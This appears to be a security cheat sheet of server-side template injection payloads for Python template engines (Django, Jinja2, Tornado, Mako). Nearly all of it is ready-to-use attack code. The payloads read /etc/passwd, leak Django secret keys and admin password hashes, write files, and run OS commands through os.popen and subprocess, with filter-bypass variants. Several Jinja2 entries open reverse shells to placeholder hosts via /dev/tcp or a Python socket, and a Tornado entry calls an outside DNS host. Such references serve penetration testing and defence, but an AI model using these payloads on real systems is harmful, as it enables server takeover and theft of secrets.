# Server Side Template Injection - Python

> Server-Side Template Injection (SSTI)  is a vulnerability that arises when an attacker can inject malicious input into a server-side template, causing arbitrary code execution on the server. In Python, SSTI can occur when using templating engines such as Jinja2, Mako, or Django templates, where user input is included in templates without proper sanitization.

## Summary

- [Templating Libraries](#templating-libraries)
- [Django](#django)
    - [Django - Basic Injection](#django---basic-injection)
    - [Django - Cross-Site Scripting](#django---cross-site-scripting)
    - [Django - Debug Information Leak](#django---debug-information-leak)
    - [Django - Leaking App's Secret Key](#django---leaking-apps-secret-key)
    - [Django - Admin Site URL leak](#django---admin-site-url-leak)
    - [Django - Admin Username and Password Hash Leak](#django---admin-username-and-password-hash-leak)
- [Jinja2](#jinja2)
    - [Jinja2 - Basic Injection](#jinja2---basic-injection)
    - [Jinja2 - Template Format](#jinja2---template-format)
    - [Jinja2 - Debug Statement](#jinja2---debug-statement)
    - [Jinja2 - Dump All Used Classes](#jinja2---dump-all-used-classes)
    - [Jinja2 - Dump All Config Variables](#jinja2---dump-all-config-variables)
    - [Jinja2 - Read Remote File](#jinja2---read-remote-file)
    - [Jinja2 - Write Into Remote File](#jinja2---write-into-remote-file)
    - [Jinja2 - Remote Command Execution](#jinja2---remote-command-execution)
        - [Forcing Output On Blind RCE](#jinja2---forcing-output-on-blind-rce)
        - [Exploit The SSTI By Calling os.popen().read()](#exploit-the-ssti-by-calling-ospopenread)
        - [Exploit The SSTI By Calling subprocess.Popen](#exploit-the-ssti-by-calling-subprocesspopen)
        - [Exploit The SSTI By Calling Popen Without Guessing The Offset](#exploit-the-ssti-by-calling-popen-without-guessing-the-offset)
        - [Exploit The SSTI By Writing an Evil Config File](#exploit-the-ssti-by-writing-an-evil-config-file)
    - [Jinja2 - Filter Bypass](#jinja2---filter-bypass)
- [Tornado](#tornado)
    - [Tornado - Basic Injection](#tornado---basic-injection)
    - [Tornado - Remote Command Execution](#tornado---remote-command-execution)
- [Mako](#mako)
    - [Mako - Remote Command Execution](#mako---remote-command-execution)
- [References](#references)

## Templating Libraries

| Template Name | Payload Format |
| ------------ | --------- |
| Bottle    | `{{ }}`  |
| Chameleon | `${ }`   |
| Cheetah   | `${ }`   |
| Django    | `{{ }}`  |
| Jinja2    | `{{ }}`  |
| Mako      | `${ }`   |
| Pystache  | `{{ }}`  |
| Tornado   | `{{ }}`  |

## Django

Django template language supports 2 rendering engines by default: Django Templates (DT) and Jinja2. Django Templates is much simpler engine. It does not allow calling of passed object functions and impact of SSTI in DT is often less severe than in Jinja2.

### Django - Basic Injection

```python
{% csrf_token %} # Causes error with Jinja2
{{ 7*7 }}  # Error with Django Templates
ih0vr{{364|add:733}}d121r # Burp Payload -> ih0vr1097d121r
```

### Django - Cross-Site Scripting

```python
{{ '<script>alert(3)</script>' }}
{{ '<script>alert(3)</script>' | safe }}
```

### Django - Debug Information Leak

```python
{% debug %}
```

### Django - Leaking App's Secret Key

```python
{{ messages.storages.0.signer.key }}
```

### Django - Admin Site URL leak

```python
{% include 'admin/base.html' %}
```

### Django - Admin Username And Password Hash Leak

```ps1
{% load log %}{% get_admin_log 10 as log %}{% for e in log %}
{{e.user.get_username}} : {{e.user.password}}{% endfor %}

{% get_admin_log 10 as admin_log for_user user %}
```

---

## Jinja2

[Official website](https://jinja.palletsprojects.com/)
> Jinja2 is a full featured template engine for Python. It has full unicode support, an optional integrated sandboxed execution environment, widely used and BSD licensed.  

### Jinja2 - Basic Injection

```python
{{4*4}}[[5*5]]
{{7*'7'}} would result in 7777777
{{config.items()}}
```

Jinja2 is used by Python Web Frameworks such as Django or Flask.
The above injections have been tested on a Flask application.

### Jinja2 - Template Format

```python
{% extends "layout.html" %}
{% block body %}
  <ul>
  {% for user in users %}
    <li><a href="{{ user.url }}">{{ user.username }}</a></li>
  {% endfor %}
  </ul>
{% endblock %}

```

### Jinja2 - Debug Statement

If the Debug Extension is enabled, a `{% debug %}` tag will be available to dump the current context as well as the available filters and tests. This is useful to see what’s available to use in the template without setting up a debugger.

```python
<pre>{% debug %}</pre>
```

Source: <https://jinja.palletsprojects.com/en/2.11.x/templates/#debug-statement>

### Jinja2 - Dump All Used Classes

```python
{{ [].class.base.subclasses() }}
{{''.class.mro()[1].subclasses()}}
{{ ''.__class__.__mro__[2].__subclasses__() }}
```

Access `__globals__` and `__builtins__`:

```python
{{ self.__init__.__globals__.__builtins__ }}
```

### Jinja2 - Dump All Config Variables

```python
{% for key, value in config.iteritems() %}
    <dt>{{ key|e }}</dt>
    <dd>{{ value|e }}</dd>
{% endfor %}
```

### Jinja2 - Read Remote File

```python
# ''.__class__.__mro__[2].__subclasses__()[40] = File class
{{ ''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read() }}
{{ config.items()[4][1].__class__.__mro__[2].__subclasses__()[40]("/tmp/flag").read() }}
# https://github.com/pallets/flask/blob/master/src/flask/helpers.py#L398
{{ get_flashed_messages.__globals__.__builtins__.open("/etc/passwd").read() }}
```

### Jinja2 - Write Into Remote File

```python
{{ ''.__class__.__mro__[2].__subclasses__()[40]('/var/www/html/myflaskapp/hello.txt', 'w').write('Hello here !') }}
```

### Jinja2 - Remote Command Execution

Listen for connection

```bash
nc -lnvp 8000
```

#### Jinja2 - Forcing Output On Blind RCE

You can import Flask functions to return an output from the vulnerable page.

```py
{{
x.__init__.__builtins__.exec("from flask import current_app, after_this_request
@after_this_request
def hook(*args, **kwargs):
    from flask import make_response
    r = make_response('Powned')
    return r
")
}}
```

#### Exploit The SSTI By Calling os.popen().read()

```python
{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}
```

But when `__builtins__` is filtered, the following payloads are context-free, and do not require anything, except being in a jinja2 Template object:

```python
{{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('id').read() }}
{{ self._TemplateReference__context.joiner.__init__.__globals__.os.popen('id').read() }}
{{ self._TemplateReference__context.namespace.__init__.__globals__.os.popen('id').read() }}
```

We can use these shorter payloads:

```python
{{ cycler.__init__.__globals__.os.popen('id').read() }}
{{ joiner.__init__.__globals__.os.popen('id').read() }}
{{ namespace.__init__.__globals__.os.popen('id').read() }}
```

Source [@podalirius_](https://twitter.com/podalirius_) : <https://podalirius.net/en/articles/python-vulnerabilities-code-execution-in-jinja-templates/>

With [objectwalker](https://github.com/p0dalirius/objectwalker) we can find a path to the `os` module from `lipsum`. This is the shortest payload known to achieve RCE in a Jinja2 template:

```python
{{ lipsum.__globals__["os"].popen('id').read() }}
```

Source: <https://twitter.com/podalirius_/status/1655970628648697860>

#### Exploit The SSTI By Calling subprocess.Popen

:warning: the number 396 will vary depending of the application.

```python
{{''.__class__.mro()[1].__subclasses__()[396]('cat flag.txt',shell=True,stdout=-1).communicate()[0].strip()}}
{{config.__class__.__init__.__globals__['os'].popen('ls').read()}}
```

#### Exploit The SSTI By Calling Popen Without Guessing The Offset

```python
{% for x in ().__class__.__base__.__subclasses__() %}{% if "warning" in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen("python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"ip\",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/cat\", \"flag.txt\"]);'").read().zfill(417)}}{%endif%}{% endfor %}
```

Simply modification of payload to clean up output and facilitate command input (<https://twitter.com/SecGus/status/1198976764351066113>)
In another GET parameter include a variable named "input" that contains the command you want to run (For example: &input=ls)

```python
{% for x in ().__class__.__base__.__subclasses__() %}{% if "warning" in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen(request.args.input).read()}}{%endif%}{%endfor%}
```

#### Exploit The SSTI By Writing An Evil Config File

```python
# evil config
{{ ''.__class__.__mro__[2].__subclasses__()[40]('/tmp/evilconfig.cfg', 'w').write('from subprocess import check_output\n\nRUNCMD = check_output\n') }}

# load the evil config
{{ config.from_pyfile('/tmp/evilconfig.cfg') }}  

# connect to evil host
{{ config['RUNCMD']('/bin/bash -c "/bin/bash -i >& /dev/tcp/x.x.x.x/8000 0>&1"',shell=True) }}
```

### Jinja2 - Filter Bypass

```python
request.__class__
request["__class__"]
```

Bypassing `_`

```python
http://localhost:5000/?exploit={{request|attr([request.args.usc*2,request.args.class,request.args.usc*2]|join)}}&class=class&usc=_

{{request|attr([request.args.usc*2,request.args.class,request.args.usc*2]|join)}}
{{request|attr(["_"*2,"class","_"*2]|join)}}
{{request|attr(["__","class","__"]|join)}}
{{request|attr("__class__")}}
{{request.__class__}}
```

Bypassing `[` and `]`

```python
http://localhost:5000/?exploit={{request|attr((request.args.usc*2,request.args.class,request.args.usc*2)|join)}}&class=class&usc=_
or
http://localhost:5000/?exploit={{request|attr(request.args.getlist(request.args.l)|join)}}&l=a&a=_&a=_&a=class&a=_&a=_
```

Bypassing `|join`

```python
http://localhost:5000/?exploit={{request|attr(request.args.f|format(request.args.a,request.args.a,request.args.a,request.args.a))}}&f=%s%sclass%s%s&a=_
```

Bypassing most common filters ('.','_','|join','[',']','mro' and 'base') by <https://twitter.com/SecGus>:

```python
{{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('id')|attr('read')()}}
```

---

## Tornado

### Tornado - Basic Injection

```py
{{7*7}}
{{7*'7'}}
```

### Tornado - Remote Command Execution

```py
{{os.system('whoami')}}
{%import os%}{{os.system('nslookup oastify.com')}}
```

---

## Mako

[Official website](https://www.makotemplates.org/)
> Mako is a template library written in Python. Conceptually, Mako is an embedded Python (i.e. Python Server Page) language, which refines the familiar ideas of componentized layout and inheritance to produce one of the most straightforward and flexible models available, while also maintaining close ties to Python calling and scoping semantics.

```python
<%
import os
x=os.popen('id').read()
%>
${x}
```

### Mako - Remote Command Execution

Any of these payloads allows direct access to the `os` module

```python
${self.module.cache.util.os.system("id")}
${self.module.runtime.util.os.system("id")}
${self.template.module.cache.util.os.system("id")}
${self.module.cache.compat.inspect.os.system("id")}
${self.__init__.__globals__['util'].os.system('id')}
${self.template.module.runtime.util.os.system("id")}
${self.module.filters.compat.inspect.os.system("id")}
${self.module.runtime.compat.inspect.os.system("id")}
${self.module.runtime.exceptions.util.os.system("id")}
${self.template.__init__.__globals__['os'].system('id')}
${self.module.cache.util.compat.inspect.os.system("id")}
${self.module.runtime.util.compat.inspect.os.system("id")}
${self.template._mmarker.module.cache.util.os.system("id")}
${self.template.module.cache.compat.inspect.os.system("id")}
${self.module.cache.compat.inspect.linecache.os.system("id")}
${self.template._mmarker.module.runtime.util.os.system("id")}
${self.attr._NSAttr__parent.module.cache.util.os.system("id")}
${self.template.module.filters.compat.inspect.os.system("id")}
${self.template.module.runtime.compat.inspect.os.system("id")}
${self.module.filters.compat.inspect.linecache.os.system("id")}
${self.module.runtime.compat.inspect.linecache.os.system("id")}
${self.template.module.runtime.exceptions.util.os.system("id")}
${self.attr._NSAttr__parent.module.runtime.util.os.system("id")}
${self.context._with_template.module.cache.util.os.system("id")}
${self.module.runtime.exceptions.compat.inspect.os.system("id")}
${self.template.module.cache.util.compat.inspect.os.system("id")}
${self.context._with_template.module.runtime.util.os.system("id")}
${self.module.cache.util.compat.inspect.linecache.os.system("id")}
${self.template.module.runtime.util.compat.inspect.os.system("id")}
${self.module.runtime.util.compat.inspect.linecache.os.system("id")}
${self.module.runtime.exceptions.traceback.linecache.os.system("id")}
${self.module.runtime.exceptions.util.compat.inspect.os.system("id")}
${self.template._mmarker.module.cache.compat.inspect.os.system("id")}
${self.template.module.cache.compat.inspect.linecache.os.system("id")}
${self.attr._NSAttr__parent.template.module.cache.util.os.system("id")}
${self.template._mmarker.module.filters.compat.inspect.os.system("id")}
${self.template._mmarker.module.runtime.compat.inspect.os.system("id")}
${self.attr._NSAttr__parent.module.cache.compat.inspect.os.system("id")}
${self.template._mmarker.module.runtime.exceptions.util.os.system("id")}
${self.template.module.filters.compat.inspect.linecache.os.system("id")}
${self.template.module.runtime.compat.inspect.linecache.os.system("id")}
${self.attr._NSAttr__parent.template.module.runtime.util.os.system("id")}
${self.context._with_template._mmarker.module.cache.util.os.system("id")}
${self.template.module.runtime.exceptions.compat.inspect.os.system("id")}
${self.attr._NSAttr__parent.module.filters.compat.inspect.os.system("id")}
${self.attr._NSAttr__parent.module.runtime.compat.inspect.os.system("id")}
${self.context._with_template.module.cache.compat.inspect.os.system("id")}
${self.module.runtime.exceptions.compat.inspect.linecache.os.system("id")}
${self.attr._NSAttr__parent.module.runtime.exceptions.util.os.system("id")}
${self.context._with_template._mmarker.module.runtime.util.os.system("id")}
${self.context._with_template.module.filters.compat.inspect.os.system("id")}
${self.context._with_template.module.runtime.compat.inspect.os.system("id")}
${self.context._with_template.module.runtime.exceptions.util.os.system("id")}
${self.template.module.runtime.exceptions.traceback.linecache.os.system("id")}
```

PoC :

```python
>>> print(Template("${self.module.cache.util.os}").render())
<module 'os' from '/usr/local/lib/python3.10/os.py'>
```

## References

- [Cheatsheet - Flask & Jinja2 SSTI - phosphore - September 3, 2018](https://pequalsnp-team.github.io/cheatsheet/flask-jinja2-ssti)
- [Exploring SSTI in Flask/Jinja2, Part II - Tim Tomes - March 11, 2016](https://web.archive.org/web/20170710015954/https://nvisium.com/blog/2016/03/11/exploring-ssti-in-flask-jinja2-part-ii/)
- [Jinja2 template injection filter bypasses - Sebastian Neef - August 28, 2017](https://0day.work/jinja2-template-injection-filter-bypasses/)
- [Python context free payloads in Mako templates - podalirius - August 26, 2021](https://podalirius.net/en/articles/python-context-free-payloads-in-mako-templates/)
